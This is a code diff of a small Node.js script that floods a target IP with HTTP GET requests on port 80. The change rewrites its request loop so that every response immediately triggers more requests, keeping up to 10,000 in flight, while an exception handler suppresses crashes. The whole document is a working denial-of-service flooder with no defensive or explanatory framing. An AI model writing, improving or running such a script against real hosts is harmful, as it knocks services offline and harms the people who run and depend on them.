@@ -6,35 +6,36 @@ var worker = args[1];
 
 process.on('uncaughtException', function(exception) {console.log(new Date(), "server down")});
 
-  var c, http, i, options, query, s, send;
+var http = require('http');
 
-  http = require('http');
-
-  options = {
+var options = {
     host: ip,
     port: 80,
     path: '/'
-  };
+};
 
-  s = 0;
-  c = 0;
+var s = 0;
+var c = 0;
 
-  query = function(param) {
-    options.path = "/?" + String(worker) + "w" + i;
+var query = function(param) {
+    options.path = "/?" + worker + "w" + i;
     s++;
-    return http.get(options);
-  };
+    return http.get(options, function(res){
+        c++
+        return send();   
+    });
+};
 
-  i = 0;
+var i = 0;
 
-  send = function() {
-    while (true) {
-      if (s - c > 10000) {
-        break;
-      }
-      query(i++);
-    }
-  };
+var send = function() {
+while (true) {
+  if (s - c > 10000) {
+    break;
+  }
+  query(i++);
+}
+};
 
-  send();
+send();
 
